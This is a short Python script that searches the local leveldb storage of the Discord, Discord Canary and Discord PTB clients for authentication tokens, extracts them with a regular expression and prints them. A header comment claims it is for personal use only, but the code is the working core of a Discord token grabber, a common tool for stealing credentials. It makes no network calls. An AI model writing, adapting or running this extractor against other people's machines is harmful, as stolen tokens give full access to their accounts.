#!/usr/bin/env python3
# This script is only for personal use.
# Do NOT use this for malicious purposes

from typing import Literal
import os
import re

VERSIONS = {"stable": "discord", "canary": "discordcanary", "ptb": "discordptb"}


def get_token(version: VERSIONS = list(VERSIONS.values())[0]) -> list[str]:
    path = os.path.join(os.path.expanduser("~/.config/"), VERSIONS[version])
    if not os.path.isdir(path):
        return []

    tokens = []
    for file in os.listdir(f"{path}/Local Storage/leveldb"):
        if file.endswith(".ldb") or file.endswith(".log"):
            try:
                with open(f"{path}/Local Storage/leveldb/{file}", "rb") as file:
                    for token in re.findall(
                        r"token.*?\"([a-zA-z0-9]+\.[a-zA-z0-9]+\.[a-zA-z0-9]+)\"",
                        file.read().decode(errors="ignore"),
                    ):
                        if not token in tokens:
                            tokens.append(token)
            except PermissionError:
                continue

    return tokens


def get_tokens(by_version: bool = False) -> dict[str, str] | list[str]:
    tokens = {} if by_version else []
    for version in VERSIONS:
        if by_version:
            tokens[version] = get_token(version)
        else:
            for token in get_token(version):
                if not token in tokens:
                    tokens.append(token)
    return tokens


if __name__ == "__main__":
    for version, tokens in get_tokens(True).items():
        print(version, tokens, sep=": ")
